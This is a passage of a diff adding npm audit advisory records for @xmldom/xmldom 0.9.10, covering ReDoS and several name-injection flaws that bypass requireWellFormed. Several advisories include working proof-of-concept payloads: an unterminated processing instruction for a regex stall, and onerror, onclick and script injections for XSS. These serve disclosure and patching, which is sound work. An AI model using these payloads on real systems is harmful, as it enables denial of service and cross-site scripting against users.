rule](https://html.spec.whatwg.org/multipage/parsing.html#rawtext-end-tag-name-state)),\nand a missing closing tag is handled explicitly, removing the quadratic output amplification. Output\nfor well-formed input is unchanged. Non-breaking; 0.9.x-only.",
+      "reported_by": null,
+      "title": "xmldom: HTML raw-text closing-tag case mismatch causes output amplification",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-83612"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@xmldom/xmldom",
+      "vulnerable_versions": ">=0.9.0-beta.1 <=0.9.11",
+      "github_advisory_id": "GHSA-6mj3-qw4j-hgrw",
+      "recommendation": "Upgrade to version 0.9.12 or later",
+      "patched_versions": ">=0.9.12",
+      "updated": "2026-09-08T20:59:55.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-178",
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-6mj3-qw4j-hgrw"
+    },
+    "1193687": {
+      "findings": [
+        {
+          "version": "0.9.10",
+          "paths": [
+            "services/api > docxtemplater@3.69.0 > @xmldom/xmldom@0.9.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/xmldom/xmldom/security/advisories/GHSA-g53g-w8rj-fmg7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-83606\n- https://github.com/xmldom/xmldom/pull/1039\n- https://github.com/xmldom/xmldom/commit/73df6b8bdbd86f904b9e8c3ab9c49aa54ef2802e\n- https://github.com/xmldom/xmldom/releases/tag/0.9.11\n- https://github.com/advisories/GHSA-g53g-w8rj-fmg7",
+      "created": "2026-09-08T20:31:50.000Z",
+      "id": 1193687,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`@xmldom/xmldom`'s processing-instruction (PI) grammar regex exhibits quadratic-time backtracking\n(ReDoS) when parsing an **unterminated** processing instruction. A single small XML document\ncontaining `<?` + a target + a long run of whitespace and no closing `?>` forces the regular\nexpression engine into O(n²) work, stalling the Node.js event loop. The input is parsed with\n`DOMParser.parseFromString` under **default options**, so it is reachable from unauthenticated,\nnetwork-delivered XML (SOAP/SAML, webhooks, uploads, XML APIs).\n\n## Details\n\nThe PI production in `lib/grammar.js` compiles (flags `mu`) to:\n\n```\n^<\\?(NameChars)(?:[\\x20\\x09\\x0D\\x0A]+([Char]*?))?\\?>\n                     ^^^ S+ greedy       ^^^ Char*? lazy\n```\n\n- `lib/grammar.js` line 261: https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/grammar.js#L261\n\nIn the optional tail `(?:S+(Char*?))?`, both the greedy separator `S+` and the lazy data `Char*?`\nmatch XML whitespace. When the required trailing `?>` is absent, the engine must ultimately fail —\nbut first it tries every partition of the whitespace run between `S+` and `Char*?`, which is O(n²)\nin the length of the trailing whitespace.\n\nThe regex is executed against the **entire remaining source string** in two places in `lib/sax.js`,\nso the whole whitespace tail is scanned:\n\n- `parsePI` — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/sax.js#L680-L691\n- `parseProcessingInstruction` — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/sax.js#L862-L879\n\n## Affected Versions\n\nOnly the `0.9.x` line is affected. `lib/grammar.js` (and this PI regex) was introduced in\ncommit `726b471` (\"fix!: preserve DOCTYPE internal subset (#498)\"), first released in\n**0.9.0-beta.9**, and is unchanged through **0.9.10**.\n\nThe `0.8.x` line (≤ 0.8.13) and the unscoped `xmldom` package (≤ 0.6.0) parse PIs via a different\ncode path bounded by `indexOf('?>')` — they do **not** contain this regex and are **not affected**\nby this issue. (They were not separately tested for a *different* PI ReDoS; the scope here is the\nspecific `grammar.js` regex.)\n\n| Line | PI code path | Affected? |\n|---|---|---|\n| `0.9.x` (0.9.0-beta.9 … 0.9.10) | `grammar.js` `PI` regex over full remaining source | **Yes** |\n| `0.8.x` (≤ 0.8.13) | `parseInstruction`, bounded by `indexOf('?>')` | No |\n| unscoped `xmldom` (≤ 0.6.0) | older `indexOf('?>')`-bounded parsing | No |\n\n## Proof of Concept\n\n```js\nconst { DOMParser } = require('@xmldom/xmldom');\nconst n = 32 * 1024;\nconst payload = '<a><?p' + ' '.repeat(n); // unterminated PI, no `?>`\nconsole.time('parse');\nnew DOMParser().parseFromString(payload, 'text/xml');\nconsole.timeEnd('parse');\n```\n\nMeasured (Node 18), trailing whitespace after `<?p`, no `?>` — time quadruples per doubling of\ninput length (canonical O(n²)):\n\n| Trailing whitespace | `g.PI.exec` | `parseFromString` |\n|---|---|---|\n| 2 KB  | 4.4 ms    | 5.1 ms   |\n| 4 KB  | 16.9 ms   | 17.0 ms  |\n| 8 KB  | 111.4 ms  | 66.3 ms  |\n| 16 KB | 263.8 ms  | 336.5 ms |\n| 32 KB | 1073.1 ms | —        |\n\n## Impact\n\nAvailability only: a single parse of a small crafted document blocks the Node.js event loop for the\nduration of the quadratic scan (≈1 s at 32 KB; multi-second with larger inputs). No memory blow-up,\nno data exposure, no integrity impact. Because XML is routinely accepted from untrusted sources and\nparsed with default options, one request can stall a server.\n\n## Fix Applied\n\nFixed in `@xmldom/xmldom` **0.9.11** (`0.9.x`-only; the `0.8.x` LTS line and the\nunscoped `xmldom` package use a different, bounded PI code path and are not affected).\n\nPR [#1039](https://github.com/xmldom/xmldom/pull/1039) inserts a fixed-width negative lookahead\n`(?!\\s)` immediately after the greedy `S+`, so the separator can no longer hand whitespace back to\nthe lazy data group:\n\n```\n- var PI = reg(/^<\\?/, '(', Name, ')', regg(S, '(', Char, '*?)'), '?', /\\?>/);\n+ var PI = reg(/^<\\?/, '(', Name, ')', regg(S, '(?!', _SChar, ')(', Char, '*?)'), '?', /\\?>/);\n```\n\nThe change is correct, minimal, and behavior-preserving: it produces identical `[target, data]`\ncaptures on all valid PIs tested (incl. whitespace-heavy, tab/newline, empty-data, and xml-decl\ncases) and removes the backtracking blow-up (linear, ~0.4 ms at 128 KB after the fix). The lookahead\nis fixed-width and cannot itself backtrack — a strict improvement with no new parsing risk.\n\n## Severity note\n\nThe complexity is **quadratic**, not exponential, so a multi-second stall requires\ntens-to-hundreds of KB of input. `VA:H` reflects that xmldom applies **no input-size limit** and the\npath runs on default-options parsing, so a single unbounded parse can fully stall the event loop.",
+      "reported_by": null,
+      "title": "xmldom PI grammar regex ReDoS: quadratic backtracking on unterminated processing instructions",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-83606"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@xmldom/xmldom",
+      "vulnerable_versions": ">=0.9.0-beta.9 <=0.9.10",
+      "github_advisory_id": "GHSA-g53g-w8rj-fmg7",
+      "recommendation": "Upgrade to version 0.9.11 or later",
+      "patched_versions": ">=0.9.11",
+      "updated": "2026-09-08T20:31:51.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-g53g-w8rj-fmg7"
+    },
+    "1193690": {
+      "findings": [
+        {
+          "version": "0.9.10",
+          "paths": [
+            "services/api > docxtemplater@3.69.0 > @xmldom/xmldom@0.9.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/xmldom/xmldom/security/advisories/GHSA-w2rr-34g9-rvrj\n- https://nvd.nist.gov/vuln/detail/CVE-2026-83607\n- https://github.com/xmldom/xmldom/pull/1043\n- https://github.com/xmldom/xmldom/pull/1050\n- https://github.com/xmldom/xmldom/commit/cba1321218b069182695813fa7565653708e172e\n- https://github.com/xmldom/xmldom/commit/d8212e632507eaf1d9f609657dd4c56abeb12d44\n- https://github.com/xmldom/xmldom/releases/tag/0.8.14\n- https://github.com/xmldom/xmldom/releases/tag/0.9.11\n- https://github.com/advisories/GHSA-w2rr-34g9-rvrj",
+      "created": "2026-09-08T20:31:08.000Z",
+      "id": 1193690,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`Document.createElement()` in `@xmldom/xmldom` accepts arbitrary strings as the `tagName` parameter with zero validation. The serializer emits the tag name verbatim into XML/HTML output. Critically, the `requireWellFormed: true` serializer option — the recommended mitigation from CVE-2026-41672, CVE-2026-41674, and CVE-2026-34601 — did NOT catch this, making it a bypass of the existing security controls.\n\nAn attacker who controls the element name string can inject arbitrary attributes (including event handlers) into the serialized output, leading to XSS when the output is consumed by a browser or downstream parser.\n\n## Details\n\n`Document.createElement()` accepts any string as `tagName` and stores it directly on the element node without validation. When the document is later serialized via `XMLSerializer.serializeToString()`, the serializer emits the `tagName` verbatim into the output.\n\nThe XML specification requires element names to conform to the `Name` production. The existing `createAttributeNS()` and `createElementNS()` methods validate qualified names against an anchored name/`QName` pattern, but `createElement()` bypasses this entirely, and the `requireWellFormed: true` serializer path performed no element-name validation — rendering it ineffective against this vector.\n\n### Root Cause\n\n1. `createElement()` stores the raw `tagName` string without any validation.\n2. The serializer's `requireWellFormed` code path did not validate element names against the XML `Name`/`QName` production.\n3. The serializer emits `tagName` directly into angle brackets: `<${tagName}...>`.\n\n## Proof of Concept\n\n```js\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\n\nconst impl = new DOMImplementation();\nconst serializer = new XMLSerializer();\nconst doc = impl.createDocument(null, 'root', null);\n\n// Inject an element whose \"name\" contains attributes with an XSS payload\nconst el = doc.createElement('img src=x onerror=\"alert(1)\"');\ndoc.documentElement.appendChild(el);\n\nconst output = serializer.serializeToString(doc, { requireWellFormed: true });\nconsole.log(output);\n// <root><img src=x onerror=\"alert(1)\"/></root>\n//\n// A browser parsing this HTML will execute alert(1).\n// requireWellFormed: true did NOT prevent the injection.\n```\n\n## Impact\n\nApplications that use `@xmldom/xmldom` to construct DOM trees and serialize them to XML/HTML are vulnerable to injection attacks if any part of an element name originates from user input. This includes:\n\n- **Cross-Site Scripting (XSS)**: Injecting event handler attributes (`onerror`, `onclick`, etc.) into HTML output consumed by browsers.\n- **XML injection**: Breaking XML document structure by injecting closing tags, new elements, or processing instructions through the element name.\n- **Security control bypass**: Applications that adopted `requireWellFormed: true` as a mitigation for CVE-2026-41672 / 41674 / 34601 remained vulnerable through this vector.\n\n`@xmldom/xmldom` can also be used inside browsers, where it mirrors the DOM API. Unlike the browser's `createElement()`, which rejects an invalid name with `InvalidCharacterError`, xmldom accepts it — developers may assume the same safety and skip validation.\n\n## Fix Applied\n\n> **⚠ Opt-in required.** Protection is not automatic. Existing serialization calls remain\n> vulnerable unless `{ requireWellFormed: true }` is explicitly passed. Applications that\n> serialize untrusted DOM content should audit all `serializeToString()` call sites and add it.\n\nWhen `{ requireWellFormed: true }` is passed, the serializer now validates each element's serialized qualified name against the XML `QName` production and throws `InvalidStateError` before emitting the start tag. This also covers the **namespace-prefix** sub-vector: an invalid prefix surfaces either in the element qualified name (`PREFIX:local`) or in a synthesized `xmlns:PREFIX` declaration, and both are QName-checked.\n\nFixed under `requireWellFormed: true` in `@xmldom/xmldom` **0.9.11** and **0.8.14**. Default serialization is unchanged.\n\n### PoC — fixed path\n\n```js\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\n\nconst doc = new DOMImplementation().createDocument(null, 'root', null);\ndoc.documentElement.appendChild(doc.createElement('img src=x onerror=\"alert(1)\"'));\n\n// Default (unchanged): verbatim — injection present\nconsole.log(new XMLSerializer().serializeToString(doc));\n// <root><img src=x onerror=\"alert(1)\"/></root>\n\n// Opt-in guard: throws InvalidStateError before serializing\ntry {\n  new XMLSerializer().serializeToString(doc, { requireWellFormed: true });\n} catch (e) {\n  console.log(e.name, e.message);\n  // InvalidStateError: The element name \"img src=x onerror=\"alert(1)\"\" is not a valid XML QName\n}\n```\n\n### Why the default stays verbatim\n\nThe W3C DOM Parsing and Serialization spec defines a `require well-formed` flag whose **default value is `false`**. With the flag unset, the serializer emits element names verbatim, matching the `XMLSerializer` behavior of Chrome, Firefox, and Safari. Unconditionally throwing would be a behavioral breaking change with no spec justification; the opt-in `requireWellFormed: true` flag lets applications that require injection safety enable strict mode without breaking existing code.\n\n### Residual limitation\n\n`createElement(tagName)` does not validate `tagName` at creation time. Enforcing an `InvalidCharacterError` for invalid names unconditionally at creation time is a breaking change and is deferred to the next breaking release. When the default serialization path is used (without `requireWellFormed: true`), invalid element names are still emitted verbatim; applications that do not pass `requireWellFormed: true` remain exposed.\n\nCreation-time validation is tracked in a public issue on the next breaking-release milestone (filed at publication — issue link to be added), targeting the next breaking release.",
+      "reported_by": null,
+      "title": "xmldom: Element name injection via createElement() bypasses requireWellFormed",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-83607"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@xmldom/xmldom",
+      "vulnerable_versions": ">=0.9.0 <=0.9.10",
+      "github_advisory_id": "GHSA-w2rr-34g9-rvrj",
+      "recommendation": "Upgrade to version 0.9.11 or later",
+      "patched_versions": ">=0.9.11",
+      "updated": "2026-09-08T20:31:09.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-91"
+      ],
+      "url": "https://github.com/advisories/GHSA-w2rr-34g9-rvrj"
+    },
+    "1193693": {
+      "findings": [
+        {
+          "version": "0.9.10",
+          "paths": [
+            "services/api > docxtemplater@3.69.0 > @xmldom/xmldom@0.9.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/xmldom/xmldom/security/advisories/GHSA-4w3w-2rp5-g8jm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-83605\n- https://github.com/xmldom/xmldom/pull/1043\n- https://github.com/xmldom/xmldom/pull/1050\n- https://github.com/xmldom/xmldom/commit/cba1321218b069182695813fa7565653708e172e\n- https://github.com/xmldom/xmldom/commit/d8212e632507eaf1d9f609657dd4c56abeb12d44\n- https://github.com/xmldom/xmldom/releases/tag/0.8.14\n- https://github.com/xmldom/xmldom/releases/tag/0.9.11\n- https://github.com/advisories/GHSA-4w3w-2rp5-g8jm",
+      "created": "2026-09-08T20:30:51.000Z",
+      "id": 1193693,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`Element.setAttribute()` in `@xmldom/xmldom` bypasses attribute name validation by calling the private `_createAttribute(name)` method, which performs no validation. The public `createAttribute()` method correctly validates names against an anchored `QName` pattern, but `setAttribute()` never uses it. The serializer escapes attribute *values* but trusts attribute *names*, allowing an attacker to inject additional attributes (including event handlers) into serialized output. The `requireWellFormed: true` option did not catch this.\n\n## Details\n\n`Element.setAttribute(name, value)` creates attribute nodes by calling the private `_createAttribute(name)` method, which performs no validation on the `name` parameter. In contrast, the public `Document.createAttribute(name)` method validates the name against the `QName` production before creating the attribute node.\n\nThe result is a two-tier validation system where the most commonly used API (`setAttribute`) takes the unvalidated path:\n\n- `doc.createAttribute(\"bad name\")` — throws `INVALID_CHARACTER_ERR` (correct).\n- `el.setAttribute(\"bad name\", \"value\")` — succeeds silently (vulnerable).\n\nThe serializer emits attribute names verbatim into the output. Because attribute values ARE escaped (quotes, ampersands, etc.), the injection must occur through the name. An attacker can terminate the current attribute and inject new ones by including quote and space characters in the attribute name.\n\n### Root Cause\n\n1. `setAttribute()` calls `_createAttribute()` (private, no validation) instead of `createAttribute()` (public, validates against `QName`).\n2. The serializer trusts attribute names and emits them unescaped.\n3. The serializer's `requireWellFormed` code path did not validate attribute names during serialization.\n\n## Proof of Concept\n\n```js\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\n\nconst impl = new DOMImplementation();\nconst serializer = new XMLSerializer();\nconst doc = impl.createDocument(null, 'root', null);\n\n// The attribute name contains a closing quote, a space, and a new attribute\ndoc.documentElement.setAttribute('class=\"safe\" onclick', 'alert(1)');\n\nconst output = serializer.serializeToString(doc, { requireWellFormed: true });\nconsole.log(output);\n// <root class=\"safe\" onclick=\"alert(1)\"/>\n//\n// The single setAttribute() call produced TWO attributes:\n//   1. class=\"safe\"\n//   2. onclick=\"alert(1)\"\n//\n// requireWellFormed: true did NOT prevent the injection.\n```\n\n### Demonstrating the validation gap\n\n```js\n// Public createAttribute correctly rejects invalid names:\ntry {\n  doc.createAttribute('class=\"safe\" onclick');\n} catch (e) {\n  console.log('createAttribute rejects:', e.message);\n}\n\n// But setAttribute (which uses _createAttribute) accepts the same input:\ndoc.documentElement.setAttribute('class=\"safe\" onclick', 'alert(1)');\n// No error thrown\n```\n\n## Impact\n\nApplications that use `setAttribute()` with any user-controlled portion of the attribute name are vulnerable to attribute injection attacks. This includes:\n\n- **Cross-Site Scripting (XSS)**: Injecting event handler attributes into HTML output consumed by browsers.\n- **Security attribute override**: Overriding security-relevant attributes such as `integrity`, `nonce`, `sandbox`, or `Content-Security-Policy` meta attributes.\n- **Validation bypass**: The public `createAttribute()` API validates while `setAttribute()` does not, creating an inconsistent security boundary that developers cannot rely on.\n- **requireWellFormed bypass**: Applications that adopted `requireWellFormed: true` as a mitigation for prior CVEs remained vulnerable.\n\n`@xmldom/xmldom` can also be used inside browsers, where it mirrors the DOM API. Unlike the browser's `setAttribute()`, which rejects an invalid attribute name with `InvalidCharacterError`, xmldom accepts it — developers may assume the same safety and skip validation.\n\n## Fix Applied\n\n> **⚠ Opt-in required.** Protection is not automatic. Existing serialization calls remain\n> vulnerable unless `{ requireWellFormed: true }` is explicitly passed. Applications that\n> serialize untrusted DOM content should audit all `serializeToString()` call sites and add it.\n\nWhen `{ requireWellFormed: true }` is passed, the serializer now validates each serialized attribute's qualified name against the XML `QName` production and throws `InvalidStateError` before emitting it. This covers ordinary attribute names **and** synthesized `xmlns:PREFIX` namespace declarations (the namespace-prefix sub-vector).\n\nFixed under `requireWellFormed: true` in `@xmldom/xmldom` **0.9.11** and **0.8.14**. Default serialization is unchanged.\n\n### PoC — fixed path\n\n```js\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\n\nconst doc = new DOMImplementation().createDocument(null, 'root', null);\ndoc.documentElement.setAttribute('class=\"safe\" onclick', 'alert(1)');\n\n// Default (unchanged): verbatim — injection present\nconsole.log(new XMLSerializer().serializeToString(doc));\n// <root class=\"safe\" onclick=\"alert(1)\"/>\n\n// Opt-in guard: throws InvalidStateError before serializing\ntry {\n  new XMLSerializer().serializeToString(doc, { requireWellFormed: true });\n} catch (e) {\n  console.log(e.name, e.message);\n  // InvalidStateError: The attribute name \"class=\"safe\" onclick\" is not a valid XML QName\n}\n```\n\n### Why the default stays verbatim\n\nThe W3C DOM Parsing and Serialization spec defines a `require well-formed` flag whose **default value is `false`**. With the flag unset, the serializer emits attribute names verbatim, matching the `XMLSerializer` behavior of Chrome, Firefox, and Safari. Unconditionally throwing would be a behavioral breaking change with no spec justification; the opt-in `requireWellFormed: true` flag lets applications that require injection safety enable strict mode without breaking existing code.\n\n### Residual limitation\n\n`setAttribute(name, value)` does not validate `name` at creation time (unlike the public `createAttribute()`, which already does). Making `setAttribute()` reject invalid names unconditionally is a breaking change and is deferred to the next breaking release. When the default serialization path is used (without `requireWellFormed: true`), attribute names set via `setAttribute()` are still emitted verbatim; applications that do not pass `requireWellFormed: true` remain exposed.\n\nCreation-time validation is tracked in a public issue on the next breaking-release milestone (filed at publication — issue link to be added), targeting the next breaking release.",
+      "reported_by": null,
+      "title": "xmldom: Attribute name injection via setAttribute() bypasses requireWellFormed",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-83605"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@xmldom/xmldom",
+      "vulnerable_versions": ">=0.9.0 <=0.9.10",
+      "github_advisory_id": "GHSA-4w3w-2rp5-g8jm",
+      "recommendation": "Upgrade to version 0.9.11 or later",
+      "patched_versions": ">=0.9.11",
+      "updated": "2026-09-08T20:30:52.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-91"
+      ],
+      "url": "https://github.com/advisories/GHSA-4w3w-2rp5-g8jm"
+    },
+    "1193695": {
+      "findings": [
+        {
+          "version": "0.9.10",
+          "paths": [
+            "services/api > docxtemplater@3.69.0 > @xmldom/xmldom@0.9.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/xmldom/xmldom/security/advisories/GHSA-c7q8-3ch8-vqpv\n- https://nvd.nist.gov/vuln/detail/CVE-2026-83616\n- https://github.com/xmldom/xmldom/pull/1071\n- https://github.com/xmldom/xmldom/pull/1072\n- https://github.com/xmldom/xmldom/commit/1cde3e31a07c41c87cfd368d6946aa477f16b4f9\n- https://github.com/xmldom/xmldom/commit/3b694872bcb5c7e3cbadba961a4be2488750ce5b\n- https://github.com/xmldom/xmldom/releases/tag/0.8.15\n- https://github.com/xmldom/xmldom/releases/tag/0.9.12\n- https://github.com/advisories/GHSA-c7q8-3ch8-vqpv",
+      "created": "2026-09-08T21:03:28.000Z",
+      "id": 1193695,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`Document.createProcessingInstruction()` in `@xmldom/xmldom` performs no validation on the `target` parameter. The `requireWellFormed: true` serializer option validates only for `:` in the target and a case-insensitive `xml` prefix, but does not check for `>` characters. A `>` in the target breaks the processing instruction boundary (`<?...?>`), allowing injection of arbitrary content into the serialized XML output.\n\n## Details\n\n`Document.createProcessingInstruction(target, data)` at `lib/dom.js` around line 2413 accepts any string as the `target` parameter and stores it on the PI node without validation.\n\nDuring serialization, the `requireWellFormed` code path (around line 3286) performs two checks on PI targets:\n\n1. Rejects targets containing `:` (namespace prefix check)\n2. Rejects targets matching `xml` case-insensitively (reserved prefix)\n\nHowever, it does NOT validate that the target conforms to the XML Name production, and critically does NOT check for `>` characters. Since processing instructions are serialized as `<?target data?>`, a `>` in the target prematurely closes the PI, causing the remaining content to be interpreted as document content by any downstream XML parser.\n\n### Root Cause\n\n1. `createProcessingInstruction()` performs no validation on `target`\n2. The serializer's `requireWellFormed` check is incomplete -- it only checks for `:` and `xml`, missing characters that break PI syntax (`>`, `?`, whitespace)\n3. The serializer emits the target verbatim: `<?${target} ${data}?>`\n\n## Proof of Concept\n\n```javascript\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\n\nconst impl = new DOMImplementation();\nconst serializer = new XMLSerializer();\nconst doc = impl.createDocument(null, 'root', null);\n\n// PI target containing > breaks the PI boundary\nconst pi = doc.createProcessingInstruction('a>', 'data');\ndoc.documentElement.appendChild(pi);\n\nconst output = serializer.serializeToString(doc, { requireWellFormed: true });\nconsole.log(output);\n// Output: <root><?a> data?></root>\n//\n// The > in the target closes the PI prematurely.\n// A downstream XML parser sees:\n//   - Processing instruction: <?a?>  (target \"a\", no data)\n//   - Text content: \" data?>\"\n//\n// requireWellFormed: true did NOT prevent the injection.\n```\n\n### Injecting elements via PI target\n\n```javascript\nconst pi2 = doc.createProcessingInstruction(\n  'a?><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script><?b',\n  ''\n);\ndoc.documentElement.appendChild(pi2);\n\nconst output2 = serializer.serializeToString(doc, { requireWellFormed: true });\nconsole.log(output2);\n// Output includes:\n//   <?a?><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script><?b ?>\n//\n// The injected <script> element is valid XHTML that a browser would execute.\n```\n\n## Impact\n\nApplications that create processing instructions with user-controlled target strings and serialize the result are vulnerable to XML injection. This enables:\n\n- **XML structure injection**: Breaking the PI boundary to inject arbitrary elements, text, or additional processing instructions into the output\n- **XSS via XHTML**: If the serialized output is served as XHTML or processed by a browser-based XML parser, injected script elements will execute\n- **XXE chain**: Injected DOCTYPE declarations or entity references could trigger XXE in downstream XML parsers that consume the output\n- **requireWellFormed bypass**: The existing well-formedness checks are incomplete and provide a false sense of security\n\n## Fix Applied\n\nUnder `requireWellFormed`, the serializer validates a processing-instruction target as an XML `NCName` (a `Name` with no colon) and rejects a case-insensitive `xml`, throwing `InvalidStateError` when the target is ill-formed — so a `>`, `?`, or whitespace in the target is now refused.\\\nOn 0.9.12 this replaces an earlier check that already rejected a colon or `xml`, so the no-colon rule is preserved.\\\n0.8.15 had no processing-instruction target check at all, so the whole target validation is new there.\\\nNon-breaking and opt-in. See the [XML `Name` production](https://www.w3.org/TR/xml/#NT-Name).\n> **⚠ Opt-in required.** Protection is not automatic. Existing serialization calls remain\n> vulnerable unless `{ requireWellFormed: true }` is explicitly passed. Applications that\n> serialize untrusted DOM content should audit all `serializeToString()` call sites and add it.\n\n### Proof of Concept - fixed path\n\n```javascript\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\n\nconst impl = new DOMImplementation();\nconst serializer = new XMLSerializer();\nconst doc = impl.createDocument(null, 'root', null);\n\n// PI target containing > breaks the PI boundary\nconst pi = doc.createProcessingInstruction('a>', 'data');\ndoc.documentElement.appendChild(pi);\n\n// Default path: emits the ill-formed target verbatim.\nconsole.log(serializer.serializeToString(doc));\n// Output: <root><?a> data?></root>\n\n// Opt-in path: the target check now rejects the break-out character.\ntry {\n  serializer.serializeToString(doc, { requireWellFormed: true });\n} catch (e) {\n  console.log(e.name); // InvalidStateError\n}\n```\n\n### Why the default stays verbatim\n\nW3C DOM Parsing's require-well-formed flag defaults to false, and the browser `XMLSerializer` emits the target verbatim in that default mode. Unconditionally throwing on an ill-formed PI target would diverge from that platform behavior and would be an unjustified breaking change, so the stricter validation is gated behind `{ requireWellFormed: true }`. (See the [W3C XML Name production](https://www.w3.org/TR/xml/#NT-Name) and [XML Processing Instructions](https://www.w3.org/TR/xml/#sec-pi).)\n\n### Residual limitation\n\nThe default serialization path still emits the ill-formed target verbatim -- only the opt-in `requireWellFormed` path is protected. Creation-time validation of the `target` in `createProcessingInstruction()` is breaking and is deferred to the next breaking release, tracked at [xmldom/xmldom#1073](https://github.com/xmldom/xmldom/issues/1073).",
+      "reported_by": null,
+      "title": "xmldom: Processing Instruction Target Injection Bypasses requireWellFormed",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-83616"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@xmldom/xmldom",
+      "vulnerable_versions": ">=0.9.0 <=0.9.11",
+      "github_advisory_id": "GHSA-c7q8-3ch8-vqpv",
+      "recommendation": "Upgrade to version 0.9.12 or later",
+      "patched_versions": ">=0.9.12",
+      "updated": "2026-09-08T21:03:31.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-91"
+      ],
+      "url": "https://github.com/advisories/GHSA-c7q8-3ch8-vqpv"
+    },
+    "1193699": {
+      "findings": [
+        {
+          "version": "0.9.10",
+          "paths": [
+            "services/api > docxtemplater@3.69.0 > @xmldom/xmldom@0.9.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/xmldom/xmldom/security/advisories/GHSA-27p8-2357-5qqv\n- https://nvd.nist.gov/vuln/detail/CVE-2026-83608\n- https://github.com/xmldom/xmldom/pull/1071\n- https://github.com/xmldom/xmldom/pull/1072\n- https://github.com/xmldom/xmldom/commit/57aec90ac57b4408ae7c5d1746bf2a693b5ed90e\n- https://github.com/xmldom/xmldom/commit/85f12eb4d14b44de33216cfb72b50af4d24e9fdd\n- https://github.com/xmldom/xmldom/releases/tag/0.8.15\n- https://github.com/xmldom/xmldom/releases/tag/0.9.12\n- https://github.com/advisories/GHSA-27p8-2357-5qqv",
+      "created": "2026-09-08T21:02:51.000Z",
+      "id": 1193699,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe `@xmldom/xmldom` serializer emits `DocumentType.name` verbatim into the\n`<!DOCTYPE …>` declaration with no well-formedness guard. GHSA-f6ww-3ggp-fr8h\n(CVE-2026-41674) hardened the serializer's `requireWellFormed` path for a\nDocumentType's sibling fields — `publicId`, `systemId`, and `internalSubset` —\nbut it did **not** add any check for `name`. A `>` (or whitespace) in the name\nterminates the doctype declaration early, letting the remaining characters\nbecome sibling markup in the serialized output.\n\nBecause `requireWellFormed: true` — the recommended mitigation for the prior\nxmldom injection CVEs — performs no validation on the DocType `name`, this is a\nbypass of that control, in the same family as the open element-name\n(GHSA-w2rr-34g9-rvrj) and attribute-name (GHSA-4w3w-2rp5-g8jm) name-injection advisories.\n\n## Details\n\nThe serializer's `DOCUMENT_TYPE_NODE` case runs the `requireWellFormed` block\nonly against `publicId`, `systemId`, and `internalSubset`, then pushes\n`n.name` directly into the buffer between the `<!DOCTYPE ` prefix and the\nclosing `>`:\n\n- 0.9.x (v0.9.10, `bb7a085`):\n  [serializer DocType case, `lib/dom.js#L3256-L3283`](https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/dom.js#L3256-L3283)\n  — the `requireWellFormed` block ([#L3259-L3269](https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/dom.js#L3259-L3269))\n  validates `publicId`/`systemId`/`internalSubset` but not `name`, which is\n  emitted verbatim at [#L3270](https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/dom.js#L3270).\n- 0.8.x (v0.8.13, `e5c1480`):\n  [serializer DocType case, `lib/dom.js#L1914-L1946`](https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/dom.js#L1914-L1946)\n  — same structure; `name` is emitted verbatim at [#L1928](https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/dom.js#L1928).\n- unscoped `xmldom` (v0.6.0, `c80a161`):\n  [`lib/dom.js#L1105`](https://github.com/xmldom/xmldom/blob/c80a161172cc4d8733583bf0cf59abfa589f6d9e/lib/dom.js#L1105)\n  emits `node.name` verbatim; this line predates `requireWellFormed`, so 